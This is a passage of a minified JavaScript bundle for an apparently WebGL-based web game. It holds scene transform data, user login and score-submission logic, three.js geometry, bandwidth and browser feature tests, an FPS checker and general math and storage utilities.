000000000124,y:3.460000000000008,z:154.43}},{position:{x:74,y:73,z:-1054},rotation:{x:.9200000000000003,y:-.10000000000000034,z:.2200000000000001},scale:{x:417.6600000000012,y:11.460000000000008,z:146.43}},{position:{x:374,y:88,z:-946},rotation:{x:1.0800000000000003,y:-.26000000000000034,z:.3800000000000001},scale:{x:417.6600000000012,y:11.460000000000008,z:146.43}},{position:{x:518,y:51,z:-738},rotation:{x:1.46,y:-.4800000000000004,z:1.0999999999999999},scale:{x:417.6600000000012,y:11.460000000000008,z:146.43}},{position:{x:0,y:0,z:0},rotation:{x:0,y:0,z:0},scale:{x:50,y:5,z:50}},{position:{x:-338,y:16,z:-1602},rotation:{x:.9200000000000003,y:-.10000000000000034,z:.10000000000000012},scale:{x:357.6600000000012,y:11.460000000000008,z:258.43}},{position:{x:-706,y:53,z:-1597},rotation:{x:1.075,y:-2.9450000000000016,z:.35499999999999976},scale:{x:408.8200000000013,y:5,z:128.07000000000025}},{position:{x:-274,y:41,z:-1462},rotation:{x:-1.1000000000000003,y:-.10000000000000038,z:-.06000000000000001},scale:{x:448.86000000000126,y:11.460000000000008,z:147.23000000000002}},{position:{x:-551,y:16,z:-1486},rotation:{x:-.6600000000000003,y:-.5000000000000009,z:.06},scale:{x:216.4600000000006,y:11.460000000000008,z:123.17000000000002}},{position:{x:-50,y:-1,z:-1586},rotation:{x:.9200000000000003,y:-.10000000000000034,z:.10000000000000012},scale:{x:357.6600000000012,y:11.460000000000008,z:258.43}},{position:{x:274,y:-10,z:-1546},rotation:{x:.9200000000000003,y:-.10000000000000034,z:.10000000000000012},scale:{x:285.6600000000012,y:11.460000000000008,z:274.83}},{position:{x:110,y:40,z:-1410},rotation:{x:-.8800000000000002,y:.09999999999999966,z:-.14000000000000004},scale:{x:448.86000000000126,y:11.460000000000008,z:147.23000000000002}},{position:{x:654,y:5,z:-1546},rotation:{x:1.92,y:-.2400000000000003,z:2.08},scale:{x:285.6600000000012,y:11.460000000000008,z:274.83}},{position:{x:493,y:50,z:-1418},rotation:{x:-.40000000000000013,y:.019999999999999327,z:.16000000000000003},scale:{x:388.6299999999932,y:13.86000000000001,z:111.57000000000008}}];
},{}],213:[function(require,module,exports){
var ns=require("shared/namespace"),storage=require("shared/utils/storage"),analytics=require("shared/analytics"),data=require("shared/stub"),defaults={logged_in:!1,email:void 0,id:void 0,login_type:void 0,name:void 0,picture:void 0,social_username:void 0,username:void 0},localScoreExpiry=2592e5,slugs=data.mission.chapters.map(function(e){return e.game.slug}),user=new(Backbone.Model.extend({initialize:function(){},autoLogin:function(e){console.log("user.autoLogin"),
(function idk(o){console.log("/api/user",o),user.set("logged_in",o.logged_in),o.users[0]&&user.set(o.users[0]),e(o.users[0])})({
    "logged_in": false,
    "users": [],
    "session_user_id": null
})}
,login:function(e,o){console.log("user.login",e);var s=600,t=500,i=screen.height/2-t/2,n=screen.width/2-s/2;window.popUpResponse=function(e){console.log("popUpResponse",e),user.set(e),user.submitLocalScores(function(){user.autoLogin(function(){var e=storage.getItem("mission_state");if(e){var s=JSON.parse(e);console.log("scraping mission state",s),user.setMissionState(s,function(){"function"==typeof o&&o(user.attributes)}),storage.removeItem("mission_state")}else"function"==typeof o&&o(user.attributes)})})},window.open("/login/"+e,"popup","display=popup,left="+n+",top="+i+",width="+s+",height="+t)},logout:function(e){console.log("user.logout"),storage.clear(),$.get("/api/logout",function(){user.set(defaults),"function"==typeof e&&e(),window.location.hash="",window.location.reload()})},setMissionState:function(e,o){o=o||function(){};var s=JSON.stringify(e);user.set("mission_state",s),user.get("logged_in")?$.post("/api/mission",{mission_state:s},function(){o()}):(storage.setItem("mission_state",s),o())},getMissionState:function(){var e,o=_.keys(ns.games.webgl||ns.games.standard);e=user.get("logged_in")?user.get("mission_state"):storage.getItem("mission_state"),("not_started"===e||null===e||void 0===e)&&(e=JSON.stringify({game:o[0],difficulty:3}));var s=JSON.parse(e);return"done"===s.game&&(s.game=o[0]),s},submitScore:function(e,o){console.log("user.submitScore",e),$.post("/api/score",e,function(e){"function"==typeof o&&o(e)})},submitLocalScores:function(e){if(console.log("user.submitLocalScores",user.get("logged_in")),!user.get("logged_in"))return void e();var o=0;slugs.forEach(function(s){var t=storage.getItem("score_"+s);if(t){o++;var i=JSON.parse(t);Date.now()-i.created_on<localScoreExpiry&&(console.log("submitting score...",i),user.submitScore(i,function(){o--,0===o&&e&&e()})),storage.removeItem("score_"+s)}}),0===o&&e()}}))(defaults);user.on("change:id",function(){console.log("setting user id",user.get("id")),analytics.setUser(user.get("id"))}),("dev"===window.env||null!==window.location.search.match("debug"))&&(window._user=user),module.exports=user;
},{"shared/analytics":107,"shared/namespace":140,"shared/stub":151,"shared/utils/storage":223}],214:[function(require,module,exports){
THREE.CylinderGeometry=function(e,t,s,r,o,c,i,n,h){THREE.Geometry.call(this),this.type="CylinderGeometry",this.parameters={radiusTop:e,radiusBottom:t,height:s,radialSegments:r,heightSegments:o,openEnded:c,thetaStart:i,thetaLength:n,subdivisions:h},e=void 0!==e?e:20,t=void 0!==t?t:20,s=void 0!==s?s:100,r=r||8,o=o||1,c=void 0!==c?c:!1,i=void 0!==i?i:0,n=void 0!==n?n:2*Math.PI,h=void 0!==h?h:1;var E,a,l,v,p=s/2,u=[],T=[];for(a=0;o>=a;a++){var H=[],R=[],d=a/o,f=d*(t-e)+e;for(E=0;r>=E;E++){var y=E/r,w=new THREE.Vector3;if(w.x=f*Math.sin(y*n+i),w.y=-d*s+p,w.z=f*Math.cos(y*n+i),0===E)this.vertices.push(w),H.push(this.vertices.length-1),R.push(new THREE.Vector2(y,1-d));else for(l=1;h>=l;l++){var V=w.clone().sub(v);V.multiplyScalar(1/h*l).add(v),this.vertices.push(V),H.push(this.vertices.length-1),R.push(new THREE.Vector2(y,1-d))}v=w}u.push(H),T.push(R)}var m,x,g=(t-e)/s;for(E=0;r>E;E++)for(l=0;h>l;l++){var z=E*h+l;for(0!==e?(m=this.vertices[u[0][E]].clone(),x=this.vertices[u[0][E+1]].clone()):(m=this.vertices[u[1][E]].clone(),x=this.vertices[u[1][E+1]].clone()),m.setY(Math.sqrt(m.x*m.x+m.z*m.z)*g).normalize(),x.setY(Math.sqrt(x.x*x.x+x.z*x.z)*g).normalize(),a=0;o>a;a++){var G=u[a][z],C=u[a+1][z],F=u[a+1][z+1],M=u[a][z+1],S=m.clone(),U=m.clone(),b=x.clone(),q=x.clone(),Y=T[a][z].clone(),j=T[a+1][z].clone(),B=T[a+1][z+1].clone(),I=T[a][z+1].clone();this.faces.push(new THREE.Face3(G,C,M,[S,U,q])),this.faceVertexUvs[0].push([Y,j,I]),this.faces.push(new THREE.Face3(C,F,M,[U.clone(),b,q.clone()])),this.faceVertexUvs[0].push([j.clone(),B,I.clone()])}}if(c===!1&&e>0)for(this.vertices.push(new THREE.Vector3(0,p,0)),E=0;r>E;E++){var G=u[0][E],C=u[0][E+1],F=this.vertices.length-1,S=new THREE.Vector3(0,1,0),U=new THREE.Vector3(0,1,0),b=new THREE.Vector3(0,1,0),Y=T[0][E].clone(),j=T[0][E+1].clone(),B=new THREE.Vector2(j.x,0);this.faces.push(new THREE.Face3(G,C,F,[S,U,b])),this.faceVertexUvs[0].push([Y,j,B])}if(c===!1&&t>0)for(this.vertices.push(new THREE.Vector3(0,-p,0)),E=0;r>E;E++){var G=u[o][E+1],C=u[o][E],F=this.vertices.length-1,S=new THREE.Vector3(0,-1,0),U=new THREE.Vector3(0,-1,0),b=new THREE.Vector3(0,-1,0),Y=T[o][E+1].clone(),j=T[o][E].clone(),B=new THREE.Vector2(j.x,1);this.faces.push(new THREE.Face3(G,C,F,[S,U,b])),this.faceVertexUvs[0].push([Y,j,B])}this.computeFaceNormals()},THREE.CylinderGeometry.prototype=Object.create(THREE.Geometry.prototype),THREE.CylinderGeometry.prototype.constructor=THREE.CylinderGeometry;
},{}],215:[function(require,module,exports){
THREE.TriangleGeometry=function(e){THREE.Geometry.call(this),this.vertices.push(new THREE.Vector3(0,e,0)),this.vertices.push(new THREE.Vector3(Math.sin(2*Math.PI/3)*e,Math.cos(2*Math.PI/3)*e,0)),this.vertices.push(new THREE.Vector3(Math.sin(4*Math.PI/3)*e,Math.cos(4*Math.PI/3)*e,0)),this.faces.push(new THREE.Face3(0,2,1)),this.faceVertexUvs[0].push([new THREE.Vector2(0,0),new THREE.Vector2(0,1),new THREE.Vector2(1,1)])},THREE.TriangleGeometry.prototype=Object.create(THREE.Geometry.prototype);
},{}],216:[function(require,module,exports){
var Promise=require("lie"),imgPath="/assets/imgs/DO-NOT-OPTIMIZE-5mb.jpg",imgSize=4995374;module.exports={test:function(){return new Promise(function(e,i){var n,o,t=new Image;t.onload=function(){o=(new Date).getTime();var i=(o-n)/1e3,t=8*imgSize,r=(t/i).toFixed(2),a=(r/1024).toFixed(2),m=(a/1024).toFixed(2);e({bps:r,kbps:a,mbps:m})},t.onerror=function(e,n){i("Invalid image, or error downloading")},n=(new Date).getTime();var r="?nnn="+n;t.src=imgPath+r})["catch"](function(e){console.log(e)})}};
},{"lie":10}],217:[function(require,module,exports){
require("shared/classList");var features=require("./features"),bandwidth=require("./bandwidth"),Promise=require("lie"),uaParser=new(require("ua-parser-js")),Client=function(){this.features=features,this.browser=uaParser.getBrowser(),this.device=uaParser.getDevice(),this.os=uaParser.getOS(),this.cpu=uaParser.getCPU(),this.engine=uaParser.getEngine(),this._uaParser=uaParser};Client.prototype.testBandwidth=function(){return new Promise(function(e,i){bandwidth.test().then(e)})["catch"](function(e){console.log(e)})},Client.prototype.determineExperience=function(){var e=this;return new Promise(function(i,t){var r="flagship";if(features.webgl){var n="iPad"===e.device.model&&window.devicePixelRatio<2,a="iPhone"===e.device.model&&screen.height<480;"iOS"===e.os.name&&(a||n)&&(r="standard");var s=e.os.version.split("."),o=parseFloat(s[0]+"."+s[1]);"Android"===e.os.name&&4.2>=o&&(r="standard")}else r="standard";var d="tablet"===e.device.type&&features.webgl===!1;(!features.canvas||d)&&(r="fallback"),"Edge"===e.browser.name&&-1===navigator.appVersion.indexOf("Trident")&&(r="standard"),this.experience=r,i(r)})["catch"](function(e){console.log(e)})};var client=new Client;void 0===client.device.type&&"Android"===client.os.name&&(client.device.type="mobile"),("dev"===window.env||null!==window.location.search.match("debug"))&&(window._client=client),module.exports=client;
},{"./bandwidth":216,"./features":218,"lie":10,"shared/classList":109,"ua-parser-js":44}],218:[function(require,module,exports){
var features={_tests:{},addTest:function(t,e){this._tests[t]=e,this.runTest(t)},runTests:function(){var t=this;_.keys(this._tests).forEach(function(e){t.runTest(e)})},runTest:function(t){var e=this._tests[t]();this[t]=e;var n=t;e===!1&&(n="no-"+n),document.documentElement.classList.add(n)}};features.addTest("touch",function(){var t="ontouchstart"in document.documentElement;return t}),features.addTest("webgl",function(){try{var t=document.createElement("canvas");return!(!window.WebGLRenderingContext||!t.getContext("webgl")&&!t.getContext("experimental-webgl"))}catch(e){return!1}}),features.addTest("canvas",function(){var t=document.createElement("canvas");return!(!t.getContext||!t.getContext("2d"))}),features.addTest("localstorage",function(){var t="modernizr";try{return window.localStorage.setItem(t,t),window.localStorage.removeItem(t),!0}catch(e){return!1}}),features.runTests(),module.exports=features;
},{}],219:[function(require,module,exports){
var FPSChecker=function(){var t,n,e,o,i,a=25,c=70,r=0,s=this;_.extend(this,Backbone.Events),_.extend(this,{init:function(){setTimeout(s.start,3e3),$(window).blur(function(){s.stop()}),$(window).focus(function(){s.start()})},stop:function(){void 0!==o&&(window.cancelAnimationFrame(o),o=void 0),void 0!==i&&(clearInterval(i),i=void 0)},start:function(){t=Date.now(),i=setInterval(s.checkFPS,2e3),s.update()},update:function(){o=window.requestAnimationFrame(s.update),n=Date.now();var e=n-t;r+=(e-r)/c,t=n},checkFPS:function(){e=1e3/r,a>e&&(s.trigger("fps-warn"),s.stop())}})};module.exports=FPSChecker;
},{}],220:[function(require,module,exports){
"use strict";var generalUtils={normalize:function(t,n,r){return(t-n)/(r-n)},lerp:function(t,n,r){return(r-n)*t+n},map:function(t,n,r,e,i){return this.lerp(this.normalize(t,n,r),e,i)},clamp:function(t,n,r){return Math.min(Math.max(t,Math.min(n,r)),Math.max(n,r))},distance:function(t,n){var r=n.x-t.x,e=n.y-t.y;return Math.sqrt(r*r+e*e)},distanceXY:function(t,n,r,e){var i=r-t,o=e-n;return Math.sqrt(i*i+o*o)},circleCollision:function(t,n){return this.distance(t,n)<=t.radius+n.radius},circlePointCollision:function(t,n,r){return this.distanceXY(t,n,r.x,r.y)<r.radius},pointInRect:function(t,n,r){return this.inRange(t,r.x,r.x+r.width)&&this.inRange(n,r.y,r.y+r.height)},inRange:function(t,n,r){return t>=Math.min(n,r)&&t<=Math.max(n,r)},rangeIntersect:function(t,n,r,e){return Math.max(t,n)>=Math.min(r,e)&&Math.min(t,n)<=Math.max(r,e)},rectIntersect:function(t,n){return this.rangeIntersect(t.x,t.x+t.width,n.x,n.x+n.width)&&this.rangeIntersect(t.y,t.y+t.height,n.y,n.y+n.height)},degreesToRads:function(t){return t/180*Math.PI},radsToDegrees:function(t){return 180*t/Math.PI},angleBetweenPoints:function(t,n){return Math.atan2(n.y-t.y,n.x-t.x)},randomRange:function(t,n){return t+Math.random()*(n-t)},randomInt:function(t,n){return Math.floor(t+Math.random()*(n-t+1))},roundToPlaces:function(t,n){var r=Math.pow(10,n);return Math.round(t*r)/r},roundNearest:function(t,n){return Math.round(t/n)*n},quadraticBezier:function(t,n,r,e,i){return i=i||{},i.x=Math.pow(1-e,2)*t.x+2*(1-e)*e*n.x+e*e*r.x,i.y=Math.pow(1-e,2)*t.y+2*(1-e)*e*n.y+e*e*r.y,i},cubicBezier:function(t,n,r,e,i,o){return o=o||{},o.x=Math.pow(1-i,3)*t.x+3*Math.pow(1-i,2)*i*n.x+3*(1-i)*i*i*r.x+i*i*i*e.x,o.y=Math.pow(1-i,3)*t.y+3*Math.pow(1-i,2)*i*n.y+3*(1-i)*i*i*r.y+i*i*i*e.y,o},multicurve:function(t,n){var r,e,i,o;n.moveTo(t[0].x,t[0].y);for(var a=1;a<t.length-2;a+=1)r=t[a],e=t[a+1],i=(r.x+e.x)/2,o=(r.y+e.y)/2,n.quadraticCurveTo(r.x,r.y,i,o);r=t[t.length-2],e=t[t.length-1],n.quadraticCurveTo(r.x,r.y,e.x,e.y)},pointOnSphere:function(t,n,r){return{x:t*Math.cos(n)*Math.sin(r),y:t*Math.sin(n)*Math.sin(r),z:t*Math.cos(r)}},getPointsOnSphere:function(t){for(var n,r=[],e=0;t>e;e++)n=this.pointOnSphere(1,Math.random()*Math.PI*2,Math.random()*Math.PI*2),r.push({x:n.x,y:n.y,z:n.z});return r},getPointsOnSphereEvenly:function(t){for(var n,r,e,i,o,a=[],u=Math.PI*(3-Math.sqrt(5)),c=2/t,h=0;t>h;h++)r=h*c-1+c/2,i=Math.sqrt(1-r*r),o=h*u,n=Math.cos(o)*i,e=Math.sin(o)*i,a.push({x:n,y:r,z:e});return a},clone:function(t){return JSON.parse(JSON.stringify(t))},isArray:function(t){return"[object Array]"===Object.prototype.toString.call(t)},shuffleArray:function(t){for(var n,r,e=t.length;0!==e;)r=Math.floor(Math.random()*e),e-=1,n=t[e],t[e]=t[r],t[r]=n;return t},thinOutArray:function(t,n){for(var r=[],e=t.length,i=0;e>i;i+=n)r.push(t[i]);return r},randomItemFromArray:function(t){return t[Math.random()*t.length|0]},arrayRestrictedToRangeZ:function(t,n,r){for(var e=[],i=t.length,o=0;i>o;o++)this.inRange(t[o].z,n,r)&&e.push(t[o]);return e},extractKeyFromArray:function(t,n){for(var r=[],e=0;e<t.length;e++)r.push(t[e][n]);return r},repeat:function(t,n,r,e,i){i=i||0;var o=0,a=function(){setTimeout(function(){t(n),o++,r>o&&a()},e)};setTimeout(function(){a()},i)},isOpera:function(){return!!window.opera||navigator.userAgent.indexOf(" OPR/")>=0},isFirefox:function(){return"undefined"!=typeof InstallTrigger},isSafari:function(){return Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor")>0},isChrome:function(){return!!window.chrome&&!this.isOpera()},isIE:function(){return!!document.documentMode},isMac:function(){return navigator.platform.toLowerCase().indexOf("mac")>-1},isWindows:function(){return navigator.platform.toLowerCase().indexOf("win")>-1},hasWebGL:function(){if(window.WebGLRenderingContext){for(var t=document.createElement("canvas"),n=["webgl","experimental-webgl","moz-webgl","webkit-3d"],r=!1,e=0;4>e;e++)try{if(r=t.getContext(n[e]),r&&"function"==typeof r.getParameter)return!0}catch(i){}return!1}return!1},getVideoType:function(t){return-1!==t.indexOf(".mp4")?"video/mp4":-1!==t.indexOf(".webm")?"video/webm":-1!==t.indexOf(".ogg")?"video/ogg":void 0},dispatchEvent:function(t,n){n=n||null;var r;this.isIE()?(r=document.createEvent("CustomEvent"),r.initCustomEvent(t,!0,!1,n),document.dispatchEvent(r)):(r=new CustomEvent(t,{detail:n}),document.dispatchEvent(r))},setCursor:function(t,n){n=n||document.body,n.style.cursor!==t&&(n.style.cursor=t)}};module.exports=generalUtils;
},{}],221:[function(require,module,exports){
var namespace=require("shared/namespace"),Prompt=function(e){function n(){c.classList.remove("fade-in"),c.classList.add("fade-out"),setTimeout(function(){c.parentNode.removeChild(c)},300)}function t(){n(),o.onCancel&&o.onCancel()}function a(){n(),o.onAccept()}var o=this,c=document.createElement("div");c.className="prompt";var s=$(c);s.on("click",".close-btn",t),s.on("click",".accept-btn",a),_.extend(this,e),_.extend(this,{show:function(){c.innerHTML=namespace.templates.prompt(o),c.classList.remove("fade-out"),document.body.appendChild(c),c.classList.add("fade-in")},hide:n})};module.exports=Prompt;
},{"shared/namespace":140}],222:[function(require,module,exports){
module.exports=function(n,r){var t={};r&&r.args&&(t=r.args);var u=function(r){if(r)for(var u=0;u<r.length;u++)t[n[0].o[u]]=r[u]},f=function(n){var r=[];if(n)for(var u=0;u<n.length;u++)t[n[u]]?r.push(t[n[u]]):r.push(null);return r},o=function(){u(arguments),n.shift(),n.length?a():r.completed(t)},a=function(){var r=f(n[0].i);r.push(o),n[0].fn.apply(this,r)};a()};
},{}],223:[function(require,module,exports){
var storage={getItem:function(t){var e;try{e=window.localStorage.getItem(t)}catch(o){}return e},setItem:function(t,e){try{window.localStorage.setItem(t,e)}catch(o){}},removeItem:function(t){try{window.localStorage.removeItem(t)}catch(e){}},clear:function(){try{window.localStorage.clear()}catch(t){}}};window._storage=storage,module.exports=storage;
},{}],224:[function(require,module,exports){
var textFlicker=function(t,e){var a="abcdefghijklmnopqrstuvwxyz";e=_.extend({delay:0},e);var o=t.getAttribute("data-label").split("");t.innerHTML="",o.forEach(function(o){var r=$("<span>").html(o);t.appendChild(r[0]);var n=r.css("color");r.css({position:"relative",color:"transparent",opacity:1});var l=r.html().toUpperCase(),i=.7*Math.random()+.3,s=$("<div>").css({position:"absolute",top:0,left:0,color:n,width:"100%",textAlign:"center",letterSpacing:0,textTransform:"none"}).html(Math.random()>.5?_.sample(a):" ");r.append(s);var p=TweenLite.fromTo(s,.5,{opacity:0},{opacity:1,ease:new window.RoughEase({steps:20,strength:100}),delay:.25*Math.random()+e.delay,onUpdate:function(){p.totalProgress()>i&&s.html(l)}})})};module.exports=textFlicker;
},{}],225:[function(require,module,exports){
var util={padInt:function(t,r){for(var n=""+Math.floor(r);n.length<t;)n="0"+n;return n},getDistance:function(t,r,n,a){var e=t-n,o=r-a;return Math.sqrt(e*e+o*o)}};module.exports=util;
},{}]},{},[1]);
